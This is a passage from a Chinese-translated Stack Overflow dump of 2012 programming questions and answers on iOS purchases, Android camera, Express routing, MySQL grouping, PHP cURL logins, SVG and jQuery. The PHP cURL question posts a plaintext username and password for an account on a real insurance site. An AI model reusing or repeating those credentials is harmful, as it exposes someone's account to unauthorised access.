我`loadStore`在收到错误后调用该方法

SKProductsRequest 在我的应用程序崩溃之前不调用 - (void)productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse *)response 方法！

我的代码有什么问题如何解决！提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:45:44.167

我已经使用此代码在我的应用程序中完成了 inapppurchase 的代码，没有问题

```
- (void)loadStore
{
// restarts any purchases if they were interrupted last time the app was open
[[SKPaymentQueue defaultQueue] addTransactionObserver:self];

// get the product description (defined in early sections)
[self requestProUpgradeProductData];
}

- (void)requestProUpgradeProductData
{
NSSet *productIdentifiers = [NSSet setWithObject:kInAppPurchaseProUpgradeProductId];
productsRequest = [[SKProductsRequest alloc] initWithProductIdentifiers:productIdentifiers];
productsRequest.delegate = self;
[productsRequest start];

// we will release the request object in the delegate callback
} 
```

在此之后它将调用此方法

```
- (void)productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse *)response
{
NSArray *products = response.products;
proUpgradeProduct = [products count] == 1 ? [[products objectAtIndex:0] retain] : nil;
if (proUpgradeProduct)
{
    NSLog(@"Product title: %@" , proUpgradeProduct.localizedTitle);
    NSLog(@"Product description: %@" , proUpgradeProduct.localizedDescription);
    NSLog(@"Product price: %@" , proUpgradeProduct.price);
    NSLog(@"Product id: %@" , proUpgradeProduct.productIdentifier);
    if ([self canMakePurchases]) {
        if ([self respondsToSelector:@selector(purchaseProUpgrade)]) {
            [self purchaseProUpgrade];
        }
    }
    else {
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:[self languageSelectedStringForKey:@"Error"] message:@"Cannot connect to Store.\n Please Enable the Buying in settings" delegate:self cancelButtonTitle:@"Ok" otherButtonTitles:nil, nil];
        [alert show];
        [alert release];
    }
}

for (NSString *invalidProductId in response.invalidProductIdentifiers)
{
    [SVProgressHUD dismiss];
    [cancelButton setEnabled:YES];
    [buyNowButton setEnabled:YES];
    [restoreButton setEnabled:YES];
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Warning" message:@"Error occured" delegate:self cancelButtonTitle:@"Ok" otherButtonTitles:nil, nil];
    [alert show];
    [alert release];
    NSLog(@"Invalid product id: %@" , invalidProductId);
}

// finally release the reqest we alloc/init’ed in requestProUpgradeProductData
[productsRequest release];
[[NSNotificationCenter defaultCenter] postNotificationName:kInAppPurchaseManagerProductsFetchedNotification object:self userInfo:nil];
}
- (void)completeTransaction:(SKPaymentTransaction *)transaction
{
[self recordTransaction:transaction];
[self provideContent:transaction.payment.productIdentifier];
[self finishTransaction:transaction wasSuccessful:YES];
}
- (void)purchaseProUpgrade
{
[SVProgressHUD showInView:self.view status:[self languageSelectedStringForKey:@"Connecting Store"] networkIndicator:YES];
SKPayment *payment = [SKPayment paymentWithProductIdentifier:kInAppPurchaseProUpgradeProductId];
[[SKPaymentQueue defaultQueue] addPayment:payment];
}
- (void)recordTransaction:(SKPaymentTransaction *)transaction
{
if ([transaction.payment.productIdentifier isEqualToString:kInAppPurchaseProUpgradeProductId])
{
    // save the transaction receipt to disk
    [[NSUserDefaults standardUserDefaults] setValue:transaction.transactionReceipt forKey:@"proUpgradeTransactionReceipt" ];
    [[NSUserDefaults standardUserDefaults] synchronize];
}
} 
```

最后这个方法

```
- (void)finishTransaction:(SKPaymentTransaction *)transaction wasSuccessful:(BOOL)wasSuccessful
{
// remove the transaction from the payment queue.
[[SKPaymentQueue defaultQueue] finishTransaction:transaction];

NSDictionary *userInfo = [NSDictionary dictionaryWithObjectsAndKeys:transaction, @"transaction" , nil];
if (wasSuccessful)
{
//Write your transaction complete statement required for your project
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-01T12:15:33.233

遵循以下两个教程中的任何一个：

[应用内购买教程](http://www.raywenderlich.com/21081/introduction-to-in-app-purchases-in-ios-6-tutorial)

或遵循 RMStore 验证：[这里。](https://github.com/robotmedia/RMStore)

# android - 相机图像转换

> ID：11243671
> 
> 赞同：0
> 
> 时间：2012-06-28T11:32:32.083
> 
> 标签：android

```
 package map.demo;
 public class MapDemoActivity extends Activity {

        Button capture;
        ImageView image;
        int cameracode=100;
        Bitmap bm;
        Boolean result;
        FileOutputStream fos;
        File sd;

        /** Called when the activity is first created. */
        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.main);
            capture=(Button)findViewById(R.id.capture);
            capture.setOnClickListener(new OnClickListener() {

                @Override
                public void onClick(View v) {
                    // TODO Auto-generated method stub

                    image=(ImageView)findViewById(R.id.image);
                    Intent i=new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                    startActivityForResult(i, cameracode);  
                }
            });

        }
        @Override
        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
            // TODO Auto-generated method stub

                        if(requestCode==100)
                        {

                            bm=(Bitmap) data.getExtras().get("data");

                            image.setImageBitmap(bm);

                            image.setDrawingCacheEnabled(true);
                            bm = image.getDrawingCache();

                                if(bm==null)
                                {
                                    Toast.makeText(getApplicationContext(), "Image is null", 1000).show();
                                }
                                else
                                {
                                    try {

                                        fos = new FileOutputStream(new File(Environment.getExternalStorageDirectory(), "image.jpg"));

                                        result=bm.compress(CompressFormat.JPEG, 75, fos);

                                        fos.flush();
                                        fos.close();

                                    } catch (FileNotFoundException e) {
                                        // TODO Auto-generated catch block

                                        e.printStackTrace();
                                    } catch (IOException e) {
                                        // TODO Auto-generated catch block

                                        e.printStackTrace();
                                    }

                            }       
                        }

            super.onActivityResult(requestCode, resultCode, data);
        }
    } 
```

我正在执行上述代码以从相机捕获图像并将图像设置为图像视图并将图像转换为 jpeg，但我没有得到图像，它显示为空。即在图像捕获后我的代码 bm=null 中。但图像视图显示默认情况下用于相机的图像（我正在使用模拟器捕获图像）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:45:34.413

我认为这里的问题是，您没有为 ImageView 提供完全绘制的时间，而是您尝试在缓存存在之前获取缓存。所以你总是会得到 null 并且你的 Toast 会被显示。取而代之的是一种方法。看一下这个，

删除这条线，看看它是怎么回事。

```
 bm = image.getDrawingCache(); 
```

原因是您已经将捕获的图像保存到此 Bitmap 对象并将其设置为 ImageView。那么为什么又要依赖ImageView来获取位图对象呢。如果要减小图像的大小，可以使用Bitmap 类中的**createScaledBitamp**方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:44:51.453

嗨，我可能遗漏了一些东西，但你有启动相机的代码吗？

```
public CameraView(Context context, AttributeSet attrs) {
    super(context, attrs);
    // We're implementing the Callback interface and want to get notified
    // about certain surface events.
    getHolder().addCallback( this );
    // We're changing the surface to a PUSH surface, meaning we're receiving
    // all buffer data from another component - the camera, in this case.
    getHolder().setType( SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS );
}

public void surfaceCreated( SurfaceHolder holder ) {
    // Once the surface is created, simply open a handle to the camera hardware.
    //camera = Camera.open();
    try {
        camera = Camera.open();
        camera.setPreviewDisplay( holder );
    } catch( IOException e ) {
        e.printStackTrace();
    }
}

public void surfaceChanged( SurfaceHolder holder, int format, int width, int height ) {
    // This method is called when the surface changes, e.g. when it's size is set.
    // We use the opportunity to initialize the camera preview display dimensions.
    Log.d(TAG, "surfaceChanged: " + width + "x" + height);
    Camera.Parameters p = camera.getParameters();
    //p.set("orientation", "portrait");
    int w = p.getPreviewSize().width;
    int h = p.getPreviewSize().height;
    p.setPreviewSize( w, h );       
    camera.setParameters( p );

    // ...and start previewing. From now on, the camera keeps pushing preview
    // images to the surface.
    camera.startPreview();
} 
```

我假设您还像这样在清单中设置权限：

```
 <uses-permission android:name="android.permission.CAMERA"/> 
```

另请注意，如果相机设置正确，模拟器只会显示棋盘图案。如果纵横比设置正确，则图案必须是正方形（矩形表示您的图像失真）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:42:15.257

您没有获得图像，因为您没有提供任何将保存图像的图像 URI。

请看[这个](http://www.tutorialforandroid.com/2010/10/take-picture-in-android-with.html)链接。

# node.js - 如何在expressjs中使用director作为路由器

> ID：11243672
> 
> 赞同：5
> 
> 时间：2012-06-28T11:32:34.377
> 
> 标签：node.js, express, flatiron.js

我想将 express.js 与 Flatiron 的导向器（路由器）和资源丰富的（ODM）一起使用，因为我需要路由表的好处和带有验证的清理多数据库模式。我现在完全切换到 Flatiron 的原因是，因为我认为它需要更多时间，而且文档资料不多。

但是，这是我在 express 中使用 director 的当前方式：

```
var express = require('express')
  , director = require('director');

function hello(){
    console.log('Success');
}

var router = new director.http.Router({
    '/': {
        get: hello
    }
}); 
```

不幸的是，这不起作用，只给了我一个“无法获取 /”

那么该怎么办呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T17:36:08.907

```
var express = require('express')
  , director = require('director')
  , http = require('http');

var app = express();

var hello = function () {
  this.res.send(200, 'Hello World!');
};

var router = new director.http.Router({
  '/': {
    get: hello
  }
});

var middleware = function (req, res, next) {
  router.dispatch(req, res, function (err) {
    if (err == undefined || err) next();
  });
};

app.configure(function(){
  app.set('port', process.env.PORT || 3000);
  app.set('views', __dirname + '/views');
  app.set('view engine', 'jade');

  app.use(express.favicon());
  app.use(express.bodyParser());

  app.use(middleware);

  app.use(express.static(__dirname + '/public'));
});

http.createServer(app).listen(app.get('port'), function(){
  console.log("Express server listening on port " + app.get('port'));
}); 
```

[这里](http://github.com/pksunkara/bullet/tree/master/example)有一个使用 express、[resourceful](http://github.com/flatiron/resourceful)和[director](http://github.com/flatiron/director) 的示例应用程序。

如果您有更多疑问，可以在我们的 IRC 房间 #nodejitsu on freenode 询问他们。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T17:44:10.063

首先，为了使用director，你需要把它包装成一个中间件并传递给express，像这样：

```
app.use(function (req, res, next) {
  router.dispatch(req, res, function (err) {
    if (err) {
      // handle errors however you like. This one is probably not important.
    }
    next();
  });
}; 
```

除此之外：你不需要director来使用resourceful，并且express有自己的路由器（所以你甚至可能不需要/想要director）。

# objective-c - 更改 UITableView 中重新排序图标的背景颜色

> ID：11243673
> 
> 赞同：0
> 
> 时间：2012-06-28T11:32:34.877
> 
> 标签：objective-c, uitableview

在我的 UITableView 中：我的单元格是黄色的，但重新排序图标是白色的 :(

![带有白色重新排序图标的黄色行](../Images/5ba738c98325b0ea90e0cd1b90fad153.png)

有什么快速解决方法吗？最好不必继承 UITableView 或黑客太多。

顺便说一句，这种绝望的尝试没有效果：

```
cell.backgroundColor =
   cell.backgroundView.backgroundColor =
   cell.contentView.backgroundColor = [UIColor myNiceYellowColor]; 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:37:03.783

不要使用 -`cell.contentView.backgroundColor = [UIColor myNiceYellowColor];`而是更改数据源方法中的完整单元格颜色`-tableView:willDisplayCell: forRowAtIndexPath:`。

# mysql - MySQL 中的 Group-by：如何指定从其他列显示哪些数据

> ID：11243674
> 
> 赞同：0
> 
> 时间：2012-06-28T11:32:38.073
> 
> 标签：mysql

抱歉标题模棱两可；但我现在不知道如何描述它不同。

我有下表：

```
imei | date       | time  | some more fields
345  | 2012-06-28 | 07:18 | .....
345  | 2012-06-28 | 07:20 | .....
345  | 2012-06-28 | 07:21 | .....
987  | 2012-06-28 | 07:19 | .....
etc etc 
```

我想获得最新的每行不同的imei，所以：

```
345  | 2012-06-28 | 07:21
987  | 2012-06-28 | 07:19 
```

*   使用`SELECT * FROM t GROUP BY imei`导致使用第一行而不是最后一行。
*   排序`time`显然是对结果关系而不是子排序。
*   使用有只是为了陈述一个条件......

我怎样才能写一个查询来做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:39:05.637

如[手册](http://dev.mysql.com/doc/en/group-by-hidden-columns.html)所述：

> 服务器可以从每个组中自由选择任何值，因此除非它们相同，否则选择的值是不确定的。此外，从每个组中选择值不会受到添加`ORDER BY`子句的影响。结果集的排序发生在选择值之后，并且`ORDER BY`不影响服务器选择的值。

要获得分组[最大值](http://dev.mysql.com/doc/en/example-maximum-column-group-row.html)（如您所愿），您需要将分组子查询的结果与您的表连接起来：

```
SELECT * FROM t JOIN (
  SELECT imei, MAX(ADDTIME(date, time)) AS dt FROM t GROUP BY imei
) AS u ON t.imei = u.imei AND t.date = DATE(u.dt) AND t.time = TIME(u.dt) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:42:04.450

法希姆是对的。分开的日期和时间列使生活变得不必要地困难。不管。

尝试这个。

```
SELECT IMEI, MAX(STR_TO_DATE(CONCAT(`date`,` `,'`time`)))
  FROM T
 GROUP BY IMEI 
```

您可能不得不费尽心思才能使 MAX/STR/CONCAT 表达式恰到好处。

这是一个汇总查询，用于查找每个 IMEI 项目的最大日期时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T12:15:40.083

看看那个帖子：[如何将一个字段的日期与另一个字段的时间结合起来 - MS SQL Server](https://stackoverflow.com/questions/700619/how-to-combine-date-from-one-field-with-time-from-another-field-ms-sql-server)

为此，您可以简单地使用 SQL 语句：

```
SELECT imei, (date+time) AS datim, [some more fields] FROM yourTable; 
```

然后您可以在虚拟字段 datim 上使用 max、min、distinct。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-06-28T11:37:29.740

也许你应该同时订购`imei`和`date`，`time`：

```
SELECT * FROM t GROUP BY imei ORDER BY imei, date DESC, time DESC 
```

# php - 使用 Curl 登录网站，转到链接，再次提交表单并获取输出

> ID：11243676
> 
> 赞同：3
> 
> 时间：2012-06-28T11:32:41.100
> 
> 标签：php, forms, cookies, curl, login

我正在尝试登录一个网站，然后转到一个链接，然后提交一个表单以获取所需的数据。我想用 cURL 来做。我已成功登录网站。登录将我重定向到个人资料页面。

现在我需要点击链接，然后提交表格！但是当我使用 CURL 执行此操作时，会话无效。我在用于存储创建的 cookie**的 cookie.txt 文件中获取 JSESSIONID 。**我看到的所有示例都只是关于登录网站或只是提交注册表单。这只是一个**POST**请求！

成功登录并存储 cookie 后，如何转到另一个链接，然后使用 curl 提交另一个表单？

我使用 WAMP 作为我的本地服务器。

```
<?php
$username="myusername"; 
$password="mypassword"; 
$url="http://onlinelic.in/LICEPS/Login/webLogin.do";
$referer = "http://onlinelic.in/epslogin.htm"; 
$postdata = "portlet_5_6{actionForm.userName}=".$username."&portlet_5_6{actionForm.password}=".$password;
$cookie = "cookie.txt" ;
$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0");
curl_setopt($ch,CURLOPT_COOKIESESSION,false); 
curl_setopt ($ch, CURLOPT_TIMEOUT, 60); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt ($ch, CURLOPT_REFERER, $referer);
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1); 
$result = curl_exec ($ch);
logIntoLocator(); 
curl_close($ch);

function logIntoLocator()
{
    $pincode = "731234";
    $locatorType = "P";
    $url = "http://onlinelic.in/LICEPS/appmanager/Customer/CustomerHome?_nfpb=true&_windowLabel=Cust_Agent_Locator_portlet_25_2&Cust_Agent_Locator_portlet_25_2_actionOverride=%2Fportlets%2Fvisitor%2FAgentLocator%2Flocating";
    $referer = "https://customer.onlinelic.in/LICEPS/appmanager/Customer/CustomerHome?_nfpb=true&_windowLabel=CustomerLocatorsPortlet_1&_cuid=RC_t_832059&_pagechange=AgentLocator";
    $postData = "Cust_Agent_Locator_portlet_25_2wlw-radio_button_group_key:{actionForm.agentRadioOption}=".$locatorType."&Cust_Agent_Locator_portlet_25_2{actionForm.agentOption}=".$pincode;
    $cookie = "cookie.txt" ;
    $agentCurl = curl_init();
    curl_setopt ($agentCurl, CURLOPT_URL, $referer); 
    curl_setopt ($agentCurl, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt ($agentCurl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0");
    curl_setopt($agentCurl,CURLOPT_COOKIESESSION,true);
    curl_setopt ($agentCurl, CURLOPT_TIMEOUT, 60); 
    curl_setopt ($agentCurl, CURLOPT_FOLLOWLOCATION, 1); 
    curl_setopt ($agentCurl, CURLOPT_RETURNTRANSFER, 1);  
    curl_setopt ($agentCurl, CURLOPT_REFERER, $referer);
    curl_setopt ($agentCurl, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt ($agentCurl, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt ($agentCurl, CURLOPT_POSTFIELDS, $postData);
    curl_setopt ($agentCurl, CURLOPT_POST, 1); 
    $result = curl_exec ($agentCurl);    
    echo $result;   
} 
```

如果您想尝试一下，用户名是“manashch1”，密码是“nokia1105*”。在那里登录并进入 AgentLocator，在那里你可以输入密码为 731234 并获取所需的数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:47:29.987

您需要将 cookie 附加到 CURL。有两种选择：

1.  您可以通过读取 cookie 手动完成所有操作，并使用手动附加

    ```
    $ch = curl_init();
    $sCookie = 'JSESSIONID=' . $sessionIDSavedEarlier . '; path=/'; 
    curl_setopt ( $ch , CURLOPT_COOKIE, sCookie );
    ... rest of POST 
    ```

2.  您可以使用“cookie jar”（可能是最简单的）

    ```
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
    ... rest of POST 
    ```

（确保您可以读取/写入名为“cookie.txt”的文件 - 如果您有多个用户使用 hte 脚本，则通过 PHP 会话使该文件对每个用户都是唯一的！）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:47:05.307

所以你想登录，获取页面，然后转到一个只有登录后才能访问的页面？

如果是这样，请确保 cookie.txt 可由您的脚本写入，并检查 url 不包含任何特殊参数（如您的会话 ID）。您是否从个人资料页面中提取它。

如果您知道表单的内容，您应该能够直接发布到该表单的目的地，但您可能需要将引用页面设置为您登录的站点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:52:22.507

```
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields); 
```

在您的 cUrl 脚本中使用它。在哪里

> $postfields = 'form1=value1&form2=value2&form3=value3';

其中 form1,form2.. 是您的输入的“名称”属性。

# html - 如何在 SVG 文档中显示 HTML？

> ID：11243677
> 
> 赞同：1
> 
> 时间：2012-06-28T11:32:42.007
> 
> 标签：html, svg

我有直接在浏览器（目前是 IE 和 Firefox）中显示的 SVG 文档 - 通过将 *.svg 直接加载到浏览器中。这些文档包含我想显示为“HTML”的文本，例如在带有自动换行、下标和可能滚动的 HTML 窗口/面板中呈现。SVG 和 HTML 格式良好，并在正确的命名空间下进行管理。

一种典型的元素（没有样式）可能是：

```
<svg  xmlns="http://www.w3.org/2000/svg">
  <g>
    <rect x="100" y="200" width="300" height="400"/>
    <h:p xmlns:h="http://www.w3.org/1999/xhtml">
This is an <h:i>italic</h:i> and a <h:sub>subscript</h:sub> in a ...
very long ... paragraph which will need word wrapping and maybe scrolling
    </h:p>
  </g>
</svg> 
```

如果能够在给定的边界框（例如 <rect/>）内定位文本，那就太好了

请注意，目前我不想在 HTML 文档中嵌入 SVG，也不需要递归（例如 HTML 中没有 SVG）。

更新：在@Sirko 的鼓励下，我在网上发现[这篇文章](http://ajaxian.com/archives/foreignobject-hey-youve-got-html-in-my-svg)已有4 年历史。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-28T11:43:59.313

通常，`<foreignObject>`应用于在 SVG 内包含不同的标记（参见[MDN 文档](https://developer.mozilla.org/en/SVG/Element/foreignObject)）。在您的情况下，这个其他标记将是 XHTML。

```
<svg  xmlns="http://www.w3.org/2000/svg">
  <g>
    <rect x="100" y="200" width="300" height="400" style="fill: none; stroke: black; stroke-width: 1px;"/>
    <foreignObject x="100" y="200" width="300" height="400">  
      <!-- XHTML content goes here -->  
      <body xmlns="http://www.w3.org/1999/xhtml">  
        <p>
            This is an <i>italic</i> and a <sub>subscript</sub> in a ...
            very long ... paragraph which will need word wrapping and maybe scrolling
        </p>
      </body>  
    </foreignObject>  

  </g>
</svg> 
```

但是，这在主要浏览器之间存在相当多的兼容性问题！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-25T09:47:09.377

您不仅可以在 SVG 中包含 HTML，而且您甚至可以在 SVG 中的 HTML 中包含 HTML 在 HTML 中的 SVG 中...

[以下是HTML in SVG in HTML 中](https://stackoverflow.com/questions/7458546/html-in-svg-in-html)的一些示例代码：

```
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <title>HTML in SVG in HTML</title>
  <style type='text/css'>
    svg { border: 1px solid black; }
    svg div { border: 1px dotted blue; }
  </style>
</head>
<body>
<svg xmlns="http://www.w3.org/2000/svg" width="800" height="500">
  <foreignObject class="node" x="46" y="22" width="200" height="300">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <div>The quick brown fox jumps over the lazy dog. Pack my box with
         five dozen liquor jugs</div>
    </body>
  </foreignObject>
</svg>
</body>
</html> 
```

尽管如此，请注意，即使在今天（2014 年 3 月），HTML 文档中对内联 SVG 的支持充其量仍然是“古怪的”。例如，在不同的浏览器中尝试这个[Codepen 。](http://codepen.io/jslegers/full/nrFtG)

# php - PHP浮点数未正确添加 - 缺少十进制值

> ID：11243678
> 
> 赞同：4
> 
> 时间：2012-06-28T11:32:42.903
> 
> 标签：php, floating-point, number-formatting

我正在尝试获取包含数字的变量的总数，有些可能是小数。我需要将其保留到小数点后两位，并且正在使用 number_format() 函数。

```
$total =  $order->order->net+$order->order->deductions+$order->order->vat+$order->order->postage+$order->order->postage_tax; 
            echo number_format((float)$total, 2, '.', '');?> 
```

我注意到以下值加起来不正确，似乎忽略了小数。总数应该是 118.50，但我得到的是 118.00。

> 100+0+17.5+1+0

我对此进行了研究并发现了以下内容

[http://floating-point-gui.de/basic/](http://floating-point-gui.de/basic/)

我对此有点困惑。谁能解释我需要做什么？

***编辑** 下面是 $order 变量的转储，显示了我要加起来的数字。您可以看到 17.5 是 17.5 而不是 17。是不是因为它们被指定为字符串？

`object(SimpleXMLElement)#12 (21) { ["id"]=> string(6) "922704" ["shopkeeper_orderno"]=> string(4) "1001" ["customer"]=> string(6) "797893" ["creationdate"]=> string(16) "29-05-2012 11:55" ["net"]=> string(3) "100" ["vat"]=> string(4) "17.5" ["status"]=> string(1) "1" ["isnew"]=> string(1) "0" ["deductions"]=> string(1) "0" ["postage"]=> string(1) "1" ["paymentmethod"]=> string(20) "PayPal " ["instructions"]=> object(SimpleXMLElement)#17 (0) { } [2]=> object(SimpleXMLElement)#22 (1) { ["items"]=> object(SimpleXMLElement)#30 (9) { ["id"]=> string(7) "1384486" ["headerID"]=> string(6) "922704" ["productID"]=> string(7) "4959678" ["description"]=> string(13) "Wedding dress" ["net"]=> string(3) "100" ["vat"]=> string(4) "17.5" ["qty"]=> string(1) "1" ["formID"]=> string(2) "-1" ["options"]=> object(SimpleXMLElement)#31 (1) { ["options"]=> array(2) { [0]=> object(SimpleXMLElement)#32 (6) { ["id"]=> string(6) "519981" ["orderDetailsID"]=> string(7) "1384486" ["optionid"]=> string(6) "646934" ["optionCost"]=> string(1) "0" ["optionVAT"]=> string(1) "0" ["customText"]=> string(9) "size : 12" } [1]=> object(SimpleXMLElement)#33 (6) { ["id"]=> string(6) "519982" ["orderDetailsID"]=> string(7) "1384486" ["optionid"]=> string(6) "647285" ["optionCost"]=> string(1) "0" ["optionVAT"]=> string(1) "0" ["customText"]=> string(14) "Colour : Ivory" } } } } } } ["postage_tax"]=> string(1) "0" ["dispatched"]=> string(1) "0" ["paybyotherid"]=> string(2) "-1" ["wheredidyouhearid"]=> string(2) "-1"`}

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T11:41:30.567

您可以使用圆形然后数字格式：

```
 $total = 100+0+17.5+1+0.2;
//echo number_format((float)$total);  //119
  echo number_format(round((float)$total,2),2);  //118.50 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:58:31.450

你确定你所有的这些变量都是**int**或**float**类型吗？检查类型为

```
var_dump($order->order->net, $order->order->deductions, $order->order->vat,$order->order->postage, $order->order->postage_tax); 
```

如果您用于`number_format`这些变量，它们可能是字符串，请使用[floatval](http://php.net/floatval) ()。

检查示例，

```
$a = 100+0+"17,5"+1+0;
    var_dump($a); 
```

结果：int（118）

```
$b = 100+0+17.5+1+0;
    var_dump($b); 
```

结果：浮动（118.5）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-28T11:56:57.337

请检查变量的值`$order->order->vat`。我认为这不会出现 17.5，因为如果我们将您分配的值分配给变量并添加它们，它会显示正确的答案。

```
$a = 100;
$b = 0;
$c = 17.5;
$d = 1;
$e = 0; 
```

$总计 = $a + $b + $c + $d + $e; echo number_format((float)$total, 2, '.', ''); //118.50（答案）

或`floatval($var)` 用于获取变量的浮点值。

```
$total =  $order->order->net+$order->order->deductions+floatval($order->order->vat)+$order->order->postage+$order->order->postage_tax; 
 echo number_format((float)$total, 2, '.', '');?> 
```

我希望它会工作。

谢谢

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-04-01T22:25:34.673

如果您正在寻找没有任何校正或四舍五入的精确值，您应该使用[bcadd](http://php.net/manual/en/function.bcadd.php)以下函数来获取实际的两位小数点

```
$total =  $order->order->net+$order->order->deductions+$order->order->vat+$order->order->postage+$order->order->postage_tax; 
$total=bcadd(0,$total,2);
echo $total; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-28T11:40:52.673

通常，您想要舍入到 2dp 的函数是“round”而不是“number_format”。

显然，在你的回声中，他们都会做同样的事情。如果您想对它进行未来处理，Round 将永久调整该数字。

话虽如此，我在您的代码中看不到任何错误，也看不出应该删除 0.5 的任何原因。我建议您检查 $order->order->vat 实际上是 17.5 而不是 17。如果是 17，则向后追查以找到整数的位置（例如，在数据库或输入验证函数中，例如例子）

# c# - 在 Visual Studio 2010 Express 中将 MS Access 数据库添加到项目

> ID：11243680
> 
> 赞同：2
> 
> 时间：2012-06-28T11:32:46.890
> 
> 标签：c#, database, visual-studio-2010, ms-access, project

我的帖子标题几乎概括了它。忙于 Visual Studio 2010 Express 中的一个项目，只需将 AccessDB.accdb 添加到我的项目中，以便我可以在我的代码中引用**AccessDBDataSet** ...

通过将数据库添加到项目中，我似乎是成功的，但是当我尝试引用数据集时，我只是收到一个错误消息，说我的项目不包含数据集的定义，也没有扩展方法等。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T00:41:36.797

如果您询问如何连接并使用 Microsoft Access 数据库来存储信息，您需要查看此处：http: [//msdn.microsoft.com/en-us/library/5ybdbtte(v=vs.71) .aspx](http://msdn.microsoft.com/en-us/library/5ybdbtte(v=vs.71).aspx)

您可以通过视觉方式或使用一些代码来设置它。然后向下滚动并查看使用该连接创建和使用记录集，如 ADO.net 记录集的此链接（[http://msdn.microsoft.com/en-us/library/8s3saad7(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/8s3saad7(v=vs.71).aspx)）。我认为，记录集是您要问的。正如您所说，这些是您可以与数据集交互的一种方式。

否决票可能是不够清楚的问题。

# jquery - 加载后jQuery事件不起作用

> ID：11243682
> 
> 赞同：3
> 
> 时间：2012-06-28T08:25:19.490
> 
> 标签：jquery

```
$(document).ready(function(){

$(function() {
    $('a.ajaxload').click(function(e) {           
      var url = $(this).attr('href');
      $('#desktopcontainer').load(url); // load the html response into a DOM element
      e.preventDefault(); // stop the browser from following the link
    });
});

$(function() {
    $(".accordion .accordion-tabs .tab").each(function(){
        $(this).click(function(){
            if ($(this).hasClass('tab')){
            $(this).removeClass('tab');
            $(this).addClass('active');
          }else{
            $(this).removeClass('active');
                    $(this).addClass('tab');
          }

          $(this).next().slideToggle('slow');
                return false;
        });
    });
});
}); 
```

我的标签工作正常，但在我单击“a.ajaxload”向页面添加内容后，我的标签不再响应。

谁能告诉我问题出在哪里？

解决了！！！

我所做的是在加载后添加函数……看看下面的新代码，看看有什么不同。我希望它可以帮助某人。

```
$(document).ready(function(){

initDashboard();

$(function() {
    $('a.ajaxload').click(function(e) {           
      var url = $(this).attr('href');
      $('#desktopcontainer').load(url); // load the html response into a DOM element
      e.preventDefault(); // stop the browser from following the link
      initDashboard();
    });
});

function initDashboard() {
    $(".accordion .accordion-tabs .tab").each(function(){
        $(this).click(function(){
            if ($(this).hasClass('tab')){
            $(this).removeClass('tab');
            $(this).addClass('active');
          }else{
            $(this).removeClass('active');
                    $(this).addClass('tab');
          }

          $(this).next().slideToggle('slow');
                return false;
        });
    });
}

}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:34:57.120

您需要，因为它是动态添加的（例如通过方法`on()`插入）：`load`

```
$('.accordion .accordion-tabs').on('click', '.tab', function(){
   if ($(this).hasClass('tab')) {
        $(this).removeClass('tab');
        $(this).addClass('active');
   }else{
        $(this).removeClass('active');
        $(this).addClass('tab');
   }

   $(this).next().slideToggle('slow');
        return false;    
   });
}); 
```

也不需要**三次**使用 jQuery 就绪处理程序，只需将所有与 jQuery 相关的代码放入此：

```
$(document).ready(function(){

}); 
```

**文件：**

